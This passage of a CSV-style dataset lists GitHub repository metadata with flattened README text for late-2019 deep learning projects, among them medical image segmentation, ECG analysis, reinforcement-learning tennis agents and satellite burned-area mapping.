RAM None 3500 sec 338 sec 500 2 vCPUs 13 GB RAM None 6500 sec 591 sec 500 2 vCPUs 7 5 GB RAM None 120 sec 16 sec 10 1 vCPU 3 75 GB RAM None Did not run 5 sec 1 1 vCPU 3 75 GB RAM None Did not run 6 sec 2 Table 2 Show Unet and Mobile net performance on different environment Google cloud platform was used to train and test the model The training required 8 CPU 52 GB RAM and NVIDIA Tesla T4 x 1 The Unet model took almost 5 hrs to train 50 epoch with batch size of 1 While mobile net v2 only took 2 hrs to train 200 epoch with variable batch size Both models were trained on 2975 images References 1 http senseable mit edu papers pdf 20180920Cai etalTreepedia 2IEEE Conference pdf 2 https arxiv org pdf 1505 04597 pdf 3 https arxiv org pdf 1704 04861 pdf 4 https towardsdatascience com review mobilenetv1 depthwise separable convolution light Weight model a382df364b69,2019-11-13T07:53:25Z,2019-11-13T08:54:16Z,Jupyter Notebook,anant1203,User,1,1,0,18,master,anant1203,1,0,0,0,0,0,0
CPG123456,AC,n/a,CNNAttentionLSTM Abstract 32CNN LSTM RNNs CNNLSTM DNN DEAPAMIGOS Keywords EEG emotion recognition deep learning CNN LSTM Attention INTRODUCTION To be filled METHODS Pre processing To be filled etc To be filled EXPERIMENTS The Datasets To be filled Model Implemention To be filled Results To be filled CONCLUSION To be filled REFERENCES To be filled Fig 1 http images cnblogs com cnblogscom cpg123 1609385 o191209005159paperpic01 jpg,2019-12-03T01:13:20Z,2019-12-10T04:45:38Z,Python,CPG123456,User,1,1,0,14,master,CPG123456,1,0,0,0,0,0,2
moreira-matheus,udemy-numpy-stack,n/a,Deep Learning Prerequisites The Numpy Stack in Python Machine Learning examples here https github com lazyprogrammer machinelearningexamples Bonus material here http bit ly 2LENC50,2019-11-25T23:03:21Z,2019-11-26T19:16:26Z,Jupyter Notebook,moreira-matheus,User,1,1,0,9,master,moreira-matheus,1,0,0,0,0,0,0
TerryYa,BuildMLP,n/a,BuildMLP Deep Learning Homework build MLP by meself to solve 8 bit parity check 8BPC Loss Diagram 1 Final loss 0 005118133 4 layers ReLU 128 Tanh 53 Sigmoid 28 Sigmoid 1 0 005118133 png 1 Final loss 0 001718602 5 layers ReLU 128 Tanh 64 Sigmoid 28 ReLU 16 Sigmoid 1 0 001718602 png HackMD MLP 8BPC https hackmd io ThMcY3l ScO7Er4kj9Rt8w,2019-11-16T10:01:44Z,2019-11-17T06:52:52Z,Python,TerryYa,User,1,1,0,14,master,Terry54147#TerryYa,2,0,0,0,0,0,0
damikag,ML-GI_tract_Image_Classifier,n/a,ML model to automate classification of anomalies in gastrointestinal tract using Deep Learning Introduction At present Endoscopy Endoscopy is a nonsurgical procedure used to examine a person s digestive tract Using an endoscope a flexible tube with a light and camera attached to it doctors can view pictures of digestive tract on a color TV monitor is used to diagnose diseases associated with the gastrointestinal tract Normal procedure is doctors watch the live video stream and diagnose manually But it is quite inefficient and there is a high change to miss some anomaly It highly depends on doctors personal experience and expertise A research done by WHO revels that 1 8 million people die annually because of GI tract diseases and 2 8 million new GI tract cancer cases are reported annually This emphasizes the importance of make the diagnosis process efficient This project focuses on how to improve the diagnosis process using deep learning Data set KVASIR https datasets simula no kvasir data set containing images from inside the gastrointestinal GI tract is used to conduct the project The collection of images are classified into three important anatomical landmarks three clinically significant findings and two categories of images related to endoscopic polyp removal Sorting and annotation of the data set is performed by medical doctors experienced endoscopists 8 Classes of the data set Anatomical Landmarks Z line Pylorus Cecum Pathological Findings Esophagitis Polyps Ulcerative Colitis Polyp Removals Dyed and Lifted Polyps Dyed Resection Margins KVASIR version 2 https datasets simula no kvasir data kvasir dataset v2 zip is used and it contains 8000 images 1000 images for each class Data set is shuffled and split into two Train set 6400 images 800 images from each class Test set 1600 images 200 images from each class,2019-12-11T04:37:48Z,2019-12-11T14:05:54Z,Jupyter Notebook,damikag,User,1,1,0,7,master,damikag,1,0,0,0,0,0,0
dlQSM,dlQSM,n/a,Deep learning based QSM List of deep learning based quantitative susceptibility mapping QSM projects with source code and data where available Background field correction SHARQnet Details Language Python Method Background field correction Code not yet publicly available but available on request steffen bollmann cai uq edu au Reference http www sciencedirect com science article pii S0939388918301673 Dipole Inversion Deepqsm Details Language Python Method Dipole inversion Code https colab research google com github brainhack101 IntroDL blob master notebooks 2019 Bollman SteffenBollmanDeeplearningQSMtutorialOHBM ipynb Tutorial https www pathlms com ohbm courses 12238 sections 15846 videopresentations 137444 start 1 16 56 Reference https doi org 10 1016 j neuroimage 2019 03 060 QSMnet Details Language Python Method Dipole inversion Code https github com SNU LIST QSMnet Reference https doi org 10 1016 j neuroimage 2018 06 030 emsp emsp emsp emsp emsp ensphttps arxiv org abs 1909 07716 VaNDI Details Language Python Method Dipole inversion Code https www dropbox com s ubabfhwfpjphpo1 NDIToolbox zip dl 0 Reference http arxiv org abs 1909 13692 Phase to QSM autoQSM Details Language Python Method Background field correction Dipole inversion Code not yet available Reference http www sciencedirect com science article pii S1053811919306469,2019-11-21T13:40:53Z,2019-12-05T02:58:36Z,n/a,dlQSM,Organization,1,1,0,11,master,stebo85,1,0,0,0,0,0,0
visiont3lab,text_recognition,n/a,Text Recognition in Natural Scene Images Introduction Deep Learning Text recognition based on CRAFT Character Region Awareness For Text detection tested with nvidia GTX 1080 TI Requirements Install docker https www digitalocean com community tutorials how to install and use docker on ubuntu 18 04 Install nvidia docker2 https github com NVIDIA nvidia docker Setup Cloning repo cd HOME git clone https github com visiont3lab textrecognition git echo export TEXTRECOGNITION HOME textrecognition HOME bashrc source HOME bashrc Download models cd TEXTRECOGNITION code mkdir p model cd model wget load cookies tmp cookies txt https docs google com uc export download confirm wget quiet save cookies tmp cookies txt keep session cookies no check certificate https docs google com uc export download id 1gjePriCBUC8TDZbNEicojxfSA5oTGqPK O sed rn s confirm 0 9A Za z 1n p id 1gjePriCBUC8TDZbNEicojxfSA5oTGqPK O craftmlt25k pth rm rf tmp cookies txt wget load cookies tmp cookies txt https docs google com uc export download confirm wget quiet save cookies tmp cookies txt keep session cookies no check certificate https docs google com uc export download id 11TpvsQuJtOeacKrXl4vgEH4VHg4PVRFv O sed rn s confirm 0 9A Za z 1n p id 11TpvsQuJtOeacKrXl4vgEH4VHg4PVRFv O TPS ResNet BiLSTM Attn pth rm rf tmp cookies txt Run xhost local docker docker run runtime nvidia rm it name deeplearningfacerecognition env DISPLAY DISPLAY env QTX11NOMITSHM 1 volume tmp X11 unix tmp X11 unix rw device dev video0 v TEXTRECOGNITION root home ws visiont3lab deep learning all bin bash c cd root home ws code python3 demo3 py References Reference Repository https github com clovaai CRAFT pytorch,2019-11-12T09:46:04Z,2019-11-28T11:30:54Z,Python,visiont3lab,User,2,1,0,14,master,visiont3lab,1,0,0,0,1,0,0
Gram-Labs,ExPecto-Analyze,n/a,ExPecto Analyze Analysis suite for use with the ExPecto deep learning variant expression prediction model,2019-12-12T20:34:17Z,2019-12-13T02:48:01Z,n/a,Gram-Labs,Organization,1,1,0,1,master,washedgram,1,0,0,0,0,0,0
marianneke,tensor-networks,n/a,tensor networks further reading References for the PyData 2019 presentation the physics of deep learning using tensor networks Popular reading Physics today article 2019 https physicstoday scitation org doi full 10 1063 PT 3 4164 MIT Tech Review article 2016 https www technologyreview com s 602344 the extraordinary link between deep neural networks and the nature of the universe Python library tensornetwork Github https github com google tensornetwork Blog post 2019 https ai googleblog com 2019 06 introducing tensornetwork open source html initial arXiv paper 2019 https arxiv org abs 1905 01330 arXiv paper with ML application 2019 https arxiv org abs 1906 06329 arXiv paper with physics application spin chains 2019 https arxiv org abs 1905 01331 arXiv paper with physics application entanglement renormalization for quantum critical lattice models 2019 https arxiv org abs 1906 12030 Renormalization Group ML Mehta et al 2014 https arxiv org abs 1410 3831 Entanglement Measures Plenio et al 2005 https arxiv org abs quant ph 0504163 Cui et al 2016 quantum min cut max flow https aip scitation org doi abs 10 1063 1 4954231 Tensor Networks ML Stoudenmire et al 2016 https arxiv org abs 1605 05775 Levine et al 2017 https arxiv org abs 1704 01552,2019-11-04T15:54:49Z,2019-11-09T15:20:52Z,n/a,marianneke,User,1,1,0,3,master,marianneke,1,0,0,0,0,0,0
anubhavshrimal,Collaboration_Competition_Udacity_DRLND_P3,n/a,CollaborationCompetitionUdacityDRLNDP3 Project 3 done as part of the Udacity Deep Reinforcement Learning Nanodegree https www udacity com course deep reinforcement learning nanodegree nd893 The objective of this project is to create a Multi Agent Deep Deterministic Policy Gradient Learning agent that is able to maximize the reward in the Unity ML Agents https github com Unity Technologies ml agents based Tennis https github com Unity Technologies ml agents blob master docs Learning Environment Examples md tennis continuous environment Game Environment Details Game Environment https video udacity data com topher 2018 May 5af7955atennis tennis png The environment has two agents control rackets to bounce a ball over a net If an agent hits the ball over the net it receives a reward of 0 1 If an agent lets a ball hit the ground or hits the ball out of bounds it receives a reward of 0 01 Thus the goal of each agent is to keep the ball in play The observation space consists of 8 variables corresponding to the position and velocity of the ball and racket Each agent receives its own local observation Two continuous actions are available corresponding to movement toward or away from the net and jumping The task is episodic and in order to solve the environment the agents must get an average score of 0 5 over 100 consecutive episodes after taking the maximum over both agents Specifically After each episode we add up the rewards that each agent received without discounting to get a score for each agent This yields 2 potentially different scores We then take the maximum of these 2 scores This yields a single score for each episode The environment is considered solved when the average over 100 episodes of those scores is at least 0 5 Note This project uses a simulator provided by Udacity which is similar but not identical to the Tennis environment on the Unity ML Agents GitHub page https github com Unity Technologies ml agents blob master docs Learning Environment Examples md tennis Getting Started 1 Install project dependencies by following the instructions mentioned in the InstallationGuide md InstallationGuide md 2 Download the environment from one of the links below You need only select the environment that matches your operating system Linux click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisLinux zip Mac OSX click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis Tennis app zip Windows 32 bit click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisWindowsx86 zip Windows 64 bit click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisWindowsx8664 zip For Windows users Check out this link https support microsoft com en us help 827218 how to determine whether a computer is running a 32 bit version or 64 if you need help with determining if your computer is running a 32 bit version or 64 bit version of the Windows operating system For AWS If you d like to train the agent on AWS and have not enabled a virtual screen https github com Unity Technologies ml agents blob master docs Training on Amazon Web Service md then please use this link https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisLinuxNoVis zip to obtain the headless version of the environment You will not be able to watch the agent without enabling a virtual screen but you will be able to train the agent To watch the agent you should follow the instructions to enable a virtual screen https github com Unity Technologies ml agents blob master docs Training on Amazon Web Service md and then download the environment for the Linux operating system above 3 Place the file in data directory and unzip the file Instructions Following are the steps to train your agent 1 Clone this github repository bash git clone https github com anubhavshrimal CollaborationCompetitionUdacityDRLNDP3 git cd CollaborationCompetitionUdacityDRLNDP3 2 Activate the conda environment where you installed the dependencies and open jupyter notebooks bash conda activate drlnd jupyter notebook 3 Open Tennis ipynb on your browser and run all the cells of the notebook Files models checkpointactor pth and models checkpointcritic pth are the pre trained model weights for the Agent which can be used to further train the Agent or to see how the trained agent performs over the environment Tennis ipynb is the ipython notebook which trains the Agent in the reacher environment maddpg folder contains the implementation for the Agent and the actor critic models Algorithm The algorithm and hyper parameter details are mentioned in Report md Report md,2019-11-22T17:57:37Z,2019-11-23T06:24:38Z,Jupyter Notebook,anubhavshrimal,User,1,1,1,8,master,anubhavshrimal,1,0,0,0,0,0,0
TJU-Felix,JuFan,n/a,JuFan JuFan is an open source deep learning library based on the C STL,2019-11-20T06:41:45Z,2019-11-20T06:46:37Z,C++,TJU-Felix,User,1,1,0,1,master,TJU-Felix,1,0,0,1,0,0,0
ghdrl95,stock_experiment_multimodal,n/a,,2019-11-15T07:24:43Z,2019-11-15T14:00:55Z,Python,ghdrl95,User,1,1,0,6,master,ghdrl95,1,0,0,0,0,0,0
idrori,cu-tsp,n/a,Accurate Protein Structure Prediction by Embeddings and Deep Learning Representations Iddo Drori Darshan Thaker Arjun Srivatsa Daniel Jeong Yueqi Wang Linyong Nan Fan Wu Dimitri Leggas Jinhao Lei Weiyi Lu Weilong Fu Yuan Gao Sashank Karri Anand Kannan Antonio Khalil Moretti Mohammed AlQuraishi Chen Keasar Itsik Peer https github com idrori cu tsp blob master paper cuprotein paper pdf,2019-11-11T12:23:57Z,2019-12-13T10:53:57Z,Jupyter Notebook,idrori,User,6,1,1,57,master,idrori,1,0,0,8,0,8,0
BensonRen,idlm_Pytorch,n/a,Inverse deisng for meta material using deep learning Author Ben Ren This is a transfering repo from the idlmBen which is in tensorflow into the current Pytorch version There would be 5 models in this repo Finished Models 1 forward model The christian s model mapping from geometry to spectra 2 Backpropagation model Models working now 3 Tandem model 4 Variational Auto Encoder model Models to be worked on 5 Convolutional Generative Adverserial Network model Please see into the folder of each model and see the README file for developer log for more details of the progress,2019-11-25T02:12:39Z,2019-12-15T01:12:36Z,Python,BensonRen,User,1,1,0,53,master,BensonRen#ok-nc,2,0,0,0,0,0,0
hula-ai,organ_segmentation_analysis,n/a,organsegmentationanalysis Organ segmentation demo at MICCAI19 Bayesian Deep Learning for Medical Imaging tutorial Paper link DropConnect Is Effective in Modeling Uncertainty of Bayesian Deep Networks https arxiv org pdf 1906 04569 pdf Run the code There are two ways to run the code Change the configurations in config py and then run main py Run OrganSegAnalysis ipynb in jupyter notebook line by line Download data model predictions Data Pretrainedmodel Savedpredictions https www dropbox com sh 2l9jp73ji1kw9m0 AACrCpYw9M9HatNybeXnsxnha dl 0 Put those folders or files into current directory organsegmentationanalysis,2019-11-06T23:18:08Z,2019-11-26T23:44:39Z,Jupyter Notebook,hula-ai,Organization,1,1,0,2,master,ypy516478793,1,0,0,0,0,0,0
lamarrr,Barracuda,n/a,WORK IN PROGRESS,2019-12-01T14:45:44Z,2019-12-06T23:46:07Z,Cuda,lamarrr,User,1,1,0,18,master,lamarrr,1,0,0,0,0,0,0
quangkhoi1228,train_model_traffic_sign_recognize,n/a,trainmodeltrafficsignrecognize Train model Nhn din bin bo giao thng s dng deep learning Yu cu Python python 3 6 9 Packages Khuyn khch s dng Anaconda 3 to mt environment mi tn opencv ci tt c packages nh hnh pandas 0 25 2 numpy 1 17 2 matplotlib 3 1 1 tensorflow 2 0 0 opencv 3 4 2 scikit image 0 15 0 scikit learn 0 21 3 pillow 6 2 1 Chun b input Ti b nh input ti y Copy file Train zip vo trong th mc input Gii nn Run project Activate bin mi trng Anaconda 3 source ospath anaconda3 anaconda3 bin activate Activate mi trng cha cc packages cn thit conda activate opencv Di chuyn n th mc cha project cd parentProjectPath trainmodeltrafficsignrecognize master Chy file main py trong th mc main python main main py Sau khi chy xong chng ta s c file model h5 trong th mc model Lu Source code tham kho bi vit ti link Nhn din bin bo giao thng Mt s cu hnh trong file main py inputDirPath ng dn n th mc cha input modelDirPath ng dn n th mc lu model modelName Tn model s lu epochs S ln train model classes S lp input S tp nh train S th mc trong th mc Train,2019-11-08T05:06:12Z,2019-12-03T01:20:38Z,Python,quangkhoi1228,User,1,1,0,10,master,quangkhoiuit98#quangkhoi1228,2,0,0,0,0,0,0
ahottung,DLTS,n/a,DLTS Deep Learning Assisted Heuristic Tree Search This implementation was used to conduct the experiments in our paper Deep Learning Assisted Heuristic Tree Search for the Container Pre marshalling Problem https www sciencedirect com science article pii S0305054819302230 the preprint of the paper can be found here https arxiv org abs 1709 09972 Additionally to the code this repository also contains the validation and test instances and their optimal solutions used in the paper Dependencies We evaluated DLTS using Python 3 5 and keras 1 1 0 theano 0 8 2 h5py 2 7 1 Usage Example To solve the 5x5cv1 validation instances using the provided branching and bounding networks use the following command bash python deeplearn py t referencesolutions 5x5cv1validation m pre trainedmodels pmdnnmodel5x5 h5 s v pre trainedmodels pmdnnvaluemodel5x5 h5,2019-11-26T13:56:40Z,2019-11-27T18:17:02Z,Python,ahottung,User,1,1,0,3,master,ahottung,1,0,0,0,0,0,0
BusyDataForFS,ECGNet,cnn-1d#deeplearning#ecg#fcn#keras,ECG R wave and P wave localization in paper InProceedingsAbrishami2018 author H Abrishami and M Campbell and C Han and R Czosek and X Zhou title P QRS T localization in ECG using deep learning booktitle Proc IEEE EMBS Int Conf Biomedical Health Informatics BHI year 2018 pages 210 213 month mar doi 10 1109 BHI 2018 8333406 Since the code of this paper is not open I implemented the code according this paper with keras framework Data preprocess Data preprocessed in MATLAB Download data files from https www physionet org content qtdb 1 0 0 with downloadQTDB m PC will get xxxann mat for Y and xxxdata mat for X For input data to keras conveniently Segmentor m will segment all recording into complexes and position of P wave and R wave is also saved in segmentors mat if you load segmentor mat into matlab You will get segs with 96863 by 300 and anns with dimention of 96863 by 2 in workspace That mean there are 96863 complexes with length of 300 sampling points ann 1 presents position of P wave ann 2 presents position of R wave More detail can be found in paper models for fully connected net usage python python papermodelscodes denseNetPRlocalization py for 1D CNN usage python python papermodelscodes ECGNet py for 1D CNN with dropout usage python python papermodelscodes ECGNetDropout py,2019-11-26T09:31:18Z,2019-12-10T03:23:38Z,Python,BusyDataForFS,User,1,1,0,8,master,busyyang,1,0,0,0,0,0,0
sravan1947,Fall-Detection-Model,n/a,Fall Detection Model Based on Deep Learning and Internet Of Things The model detects the fall of an elderly person based on their body vibrations and angles To get the body vibration and angles here we are using two sensors accelometer and gyroscope These values are given to Multilayer Lstm model which classifies the data produced by sensors as 0 s and 1 s 0 indicates not fallen 1 indicates fallen The model can be worn by senior citizens in the form of watch or any other small device packages used 1 Tensorflow 2 Pandas 3 Numpy 4 Sklearn Dataset The data set we provided is in the form of time series data To know every thing about the model please download the ppt provided in the files,2019-11-19T15:01:37Z,2019-12-12T11:54:01Z,Python,sravan1947,User,2,1,0,17,master,sravan1947,1,0,0,0,0,0,0
vedasunkara,EBUReproducibilityChallenge,n/a,,2019-11-15T16:37:39Z,2019-12-12T22:57:04Z,Jupyter Notebook,vedasunkara,User,3,1,0,28,master,zacharyhorvitz#vedasunkara,2,0,0,0,0,2,0
JustinoDuarte,ERCAS-2019,n/a,ERCAS PI 2019 ENUCOMPI Material do Minicurso VI Deep Learning em Imagens aplicando CNNs com Keras e TensorFlow Luis Vogado Mala Claro Justino Santos Rodrigo Veras UFPI IFPI,2019-11-16T19:49:06Z,2019-11-17T23:35:32Z,Jupyter Notebook,JustinoDuarte,User,1,1,0,9,master,JustinoDuarte,1,0,0,0,0,0,0
JoseJorgeXL,text-summarizer,n/a,text summarizer A deep learning solution to the problem of automatic summarization of texts,2019-11-22T18:01:33Z,2019-12-02T17:05:47Z,Python,JoseJorgeXL,User,1,1,0,11,master,JoseJorgeXL,1,0,0,0,0,0,0
Ordgod,Lung-lobe-segmentation,n/a,Lung lobe segmentation Some resources papers websites codes books videos etc for lung lobe segmentation using deep learning Some websites for semantic segmentation https github com mrgloom awesome semantic segmentation Papers for lung lobe segmentation Papers uploaded to arxiv org will be linked to the pdf file while others will be linked to the corresponding publisher website 1 Tang H C Zhang and X J a p a Xie Automatic Pulmonary Lobe Segmentation Using Deep Learning https arxiv org pdf 1903 09879 pdf 2019 2 Tan J et al LGAN Lung Segmentation in CT Scans Using Generative Adversarial Network https arxiv org pdf 1901 03473 pdf 2019 3 Park J et al Fully Automated Lung Lobe Segmentation in Volumetric Chest CT with 3D U Net Validation with Intra and Extra Datasets J Digit Imaging https www ncbi nlm nih gov pubmed 31152273 2019 4 Lee H et al Efficient 3D Fully Convolutional Networks for Pulmonary Lobe Segmentation in CT Images https arxiv org pdf 1909 07474 pdf 2019 5 Gerard S E and J M Reinhardt Pulmonary Lobe Segmentation Using A Sequence of Convolutional Neural Networks For Marginal Learning https ieeexplore ieee org document 8759212 in 2019 IEEE 16th International Symposium on Biomedical Imaging ISBI 2019 2019 IEEE 6 Ferreira F T et al End to end supervised lung lobe segmentation in 2018 International Joint Conference on Neural Networks IJCNN 2018 IEEE https ieeexplore ieee org document 8489677 7 George K et al Pathological pulmonary lobe segmentation from ct images using progressive holistically nested neural networks and random walker in Deep Learning in Medical Image Analysis and Multimodal Learning for Clinical Decision Support 2017 Springer p 195 203 https link springer com chapter 10 1007 978 3 319 67558 923 8 Milletari F N Navab and S A Ahmadi V net Fully convolutional neural networks for volumetric medical image segmentation in 2016 Fourth International Conference on 3D Vision 3DV 2016 IEEE https arxiv org pdf 1606 04797 pdf 9 Ronneberger O P Fischer and T Brox U net Convolutional networks for biomedical image segmentation in International Conference on Medical image computing and computer assisted intervention 2015 Springer https arxiv org pdf 1505 04597 pdf 10 Wang W et al Automated Segmentation of Pulmonary Lobes using Coordination Guided Deep Neural Networks 2019 https arxiv org pdf 1904 09106 pdf Dataset Part of LUNA16 https github com deep voxel automaticpulmonarylobesegmentationusingdeeplearning The only public lung lobe annotations I found There are 50 manual annotations for 3D CT scans selected from LUNA16 https luna16 grand challenge org LTRC https ltrcpublic com The lung tissue research consortium DCC has stopped accepting new applications for specimens and or data as of September 20 2019 NHLBI is preparing to transfer all specimens and data to its BioLINCC repository Information on how to request LTRC resources after September 20 is forthcoming LIDC IDRI https wiki cancerimagingarchive net display Public LIDC IDRI Lung Image Database Consortium image collection does not provide lung lobe segmentation annotations How to overcome GPU memory limitation GPU memory limitation is an inevitable challenge for 3D medical image segmentation Some methods have been proposed for this problem 1 Down sampling Most papers will downsample input 3D images this can sacrifice the performance 2 3D patches Some papers use 3D patches cropped from the original 3D CT scans for training and testing 3 Parallel Multi GPU training Data parallism Model parallism Pipline 4 Dilated Convolution increase receptive field,2019-11-14T10:10:02Z,2019-12-05T00:52:24Z,n/a,Ordgod,User,1,1,0,7,master,Ordgod,1,0,0,0,0,0,0
pranjal-joshi,Auto-Py-lot,n/a,AutoPylot Auto Pilot made using CV Deep learning in Python for a flight simulator ToDo Add Project Details,2019-12-08T17:51:23Z,2019-12-12T13:28:32Z,Jupyter Notebook,pranjal-joshi,User,1,1,0,21,master,pranjal-joshi,1,0,0,0,0,0,2
joy-zheng,Programmist,n/a,Programmist Final Project for CSCI 1470 Deep Learning Face Aging with Identity Preserved Conditional GANs We are implementing the Face Aging With Identity Preserved Conditional Generative Adversarial Networks paper by Xu Tang Zongwei Wang Weixin Luo and Shenghua Gao We will use GANs to extract low level features from faces of different ages and encode the features to our images This is a generative model with a face aging objective Face aging is a new and exciting field in Deep Learning With the rising popularity of FaceApp and peoples concerns about privacy we were drawn to implement our version of an aging app and think over issues of data privacy deep fakes and identity theft How to Train Cross Age Celebrity Dataset 1 Run python downloaddata py to download the the Cross Age Celebrity Dataset metadata http www umiacs umd edu sirius CACD celebrity2000meta mat 817K and Face images https drive google com file d 0B3zF40otoXI3OTR0Y0MtNnVhNFU 3 5G These will be downloaded and unzipped in the data directory 2 To train the model from scratch run python3 main py 2 To test the model and get results from a saved model run python3 main py mode test Environment We have used Google s Deep Learning VM with Pytorch framework to train with GPU To run locally follow the directions in setup conda section Navigating GCP python from zipfile import ZipFile zipfile ZipFile pathtofile t zip r zipfile extractall pathtoextractfolder Setup conda wget https repo anaconda com miniconda Miniconda3 latest Linux x8664 sh bash Miniconda3 latest Linux x8664 sh rm Miniconda3 latest Linux x8664 sh source bashrc Installation conda env create f environmentgpu yml Update conda env update f environmentgpu yml Activate Deactivate conda activate clsgan conda deactivate,2019-11-10T22:31:13Z,2019-12-14T22:26:28Z,Python,joy-zheng,User,1,1,0,163,master,melisgokalp#joy-zheng#jokim96#scli-James,4,0,0,0,0,0,2
ZSoumia,Tennis_agents,n/a,Tennisagents 1 Project Overview This an an implementation of deep reinforcemet multi agents to solve a tennis game 2 Task Description 2 1 Environement For this project I am using the Tennis https github com Unity Technologies ml agents blob master docs Learning Environment Examples md tennis it simulates a tennis game With The observation space consists of 8 variables corresponding to the position and velocity of the ball and racket Each agent receives its own local observation there are two actions possible of a continuous nature Toward or away from the net Jumping For each agent An agent receives a reward of 0 1 if it hits the ball over the net An agent receives a reward of 0 01 if it hits the ball either on the ground or out of the bounds 2 2 Solving the environement this task is episodic and the environment is considered to be solved if we reach an average score over 100 episodes of at least 0 5 3 Getting started 3 1 Clone this repository git clone https github com ZSoumia Tennisagents 3 2 Set up the environment Please follow instructions from this repo https github com udacity deep reinforcement learning dependencies 3 3 Download the Unity Environment Select the Unity environement based on your opertaing system Linux click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisLinux zip Mac OSX click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis Tennis app zip Windows 32 bit click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisWindowsx86 zip Windows 64 bit click here https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisWindowsx8664 zip Check out this link https support microsoft com en us help 827218 how to determine whether a computer is running a 32 bit version or 64 if you need help with determining if your computer is running a 32 bit version or 64 bit version of the Windows operating system For AWS If you d like to train the agent on AWS and have not enabled a virtual screen then please use this link https s3 us west 1 amazonaws com udacity drlnd P3 Tennis TennisLinuxNoVis zip to obtain the headless version of the environment You will not be able to watch the agent without enabling a virtual screen but you will be able to train the agent To watch the agent you should follow the instructions to enable a virtual screen and then download the environment for the Linux operating system above Place the downloaded file into your cloned project file 4 Project structure The Agent py file contains the general structure of the Reinforcement learning agent single agent The Actor py contains the actor s network code Critic py contains the critic s network code MultiAgent py is the code of the MADDPG algorithm ReplayBuf py is the structure of the reply buffer object used pth are the models weights checkpoints of my own implementations I provided them in case some one wants to reproduce my work Tennis ipynb is the notebook that I used for the training Report md is a detailed report about my approach,2019-11-09T13:02:40Z,2019-11-13T08:15:54Z,Jupyter Notebook,ZSoumia,User,1,1,0,9,master,ZSoumia,1,0,0,0,0,0,0
mnpinto,banet,n/a,BA Net A deep learning approach for mapping and dating burned areas using temporal sequences of satellite images Graphical Abstract img graphicalabstract jpg Article submitted to the ISPRS Journal of Photogrammetry and Remote Sensing https www journals elsevier com isprs journal of photogrammetry and remote sensing How to use Install Anaconda https www anaconda com distribution Python 3 6 Install fastai and pytorch bash conda install pytorch 1 1 conda install c fastai fastai 1 0 50 post1 Clone this repository bash git clone https github com mnpinto banet git Dataset The dataset used to train the model and the pretrained weights are available at https drive google com drive folders 1142CCdtyekXHc60gtIgmIYzHdv8lMHqN usp sharing Notice that the size of the full dataset is about 160 GB You can however donwload individual regions in case you want to test with a smaller dataset Generate predictions for a new region in 5 steps The procedure to generate predictions for a new region or for a different period of the existing regions is straightforward Step 1 Define a json file with region name bounding boxes and spatial resolution Region definition files are by default on data regions and should be named as Rname json where name is the name you give to the region inside the file For example for Iberian Peninsula region the file data regions RPI json contains the following name PI bbox 10 36 5 44 pixelsize 0 01 The code is only tested with pixelsize of 0 01 Step 2 To download the reflectance data a utility script is provided run ladsweb bash however in order to use it you need to first register on the website and generate an authentication code You will also need for this script a python2 environment with SOAPpy library All remaining code work with python3 Once you are set you can run ladsweb bash and the files will be requested and downloaded Depending on the size of the request and the server availability this may take a while and notice that there is a limit for the number of files in each request Step 3 Next you need to download the VIIRS active fire data for the region you seletected This procedure is manual but you should be able to request data for the entire temporal window in one go To do that go to https firms modaps eosdis nasa gov download select Create New Request select the region based on your region bounding box for fire data source select VIIRS then select the date range and finally csv for the file format You should receive an email with the confirmation and later another with the link to download the data If not go back to the download page enter the email you used for the request and choose Check Request Status If it is completed the download link will appear Once you have the file place it in data hotspots and name it hotspotsname csv where name is the name of the region as in the json file defined in Step 1 Step 4 Now that you have all the data you can run the utility script run procdataset bash making sure to check the paths are correct in the begining of the file By default the data will be processed for the entire temporal window found Step 5 Finally you just need to run run predictmonthly bash to get the model outputs saved at data monthly name Train the model from scratch To train the model you need a dataset of image tiles and the respective targets The data for the 5 study regions is available for download at https drive google com drive folders 1142CCdtyekXHc60gtIgmIYzHdv8lMHqN usp sharing In case you want to train a model on different regions the procedure to collect VIIRS data is described on Generate predictions for a new region in 5 steps above Step 0 In case you opted for new regions you need to collect MCD64A1 collection 6 burned areas to use as targets MCD64A1 collection 6 data can be downloaded from ftp ba1 geog umd edu server description and credentials available on http modis fire umd edu files MODISC6BAUserGuide1 2 pdf section 4 Once you log into the server go to Collection 6 TIFF folder and download data for the window or windows covering your region Figure 2 on the user guide shows the delineation of the windows Step 1 Once you have the data you need to generate the dataset by runing run procdataset bash and then create the image tiles sequences for train and validation by running run createtilesdataset bash If you downloaded the dataset already in mat files format provided in the url above then you just run run createtilesdataset bash for each region to generate the tiles Step 2 To train the model then you just need to run train bash To use sequences of 64 days with 128x128 size tiles and batch size of 1 you need a 8 GB GPU You can try reducing the sequence length if your GPU has less memory or increase the batch size otherwise Step 3 After training the models you can generate the burned area maps by running run predictmonthly bash for each region and year You need to edit run predictmonthly py to update the weight files list to the ones you generated Fine tune the model for a specific region or for other data source transfer learning It is possible to fine tune the trained model weights to a specific region or using a different source for the input data e g data from VIIRS 375m bands or data from another satellite The easiest way to include a new dataset is to write a Dataset class similar to Viirs750Dataset or the other dataset classes on scripts datasets Once you have the new dataset you can follow the Train the model from scratch guideline and the only change you need to make is to make sure you load the pretrained weights before starting to train Troubleshooting If you find any bug or have any question regarding the code or applications of BA Net you can navigate to Issues tab and create a new Issue describing your problem I will try to answer as soon as possible,2019-11-27T15:32:38Z,2019-12-02T14:34:11Z,Python,mnpinto,User,1,1,1,3,master,mnpinto,1,0,0,0,0,0,0
VIVG123,MLP-multivariable-polynomial-function-approximation,n/a,,2019-11-16T07:07:54Z,2019-11-22T06:37:35Z,Jupyter Notebook,VIVG123,User,1,1,0,2,master,vivekgusain0898,1,0,0,0,0,0,0
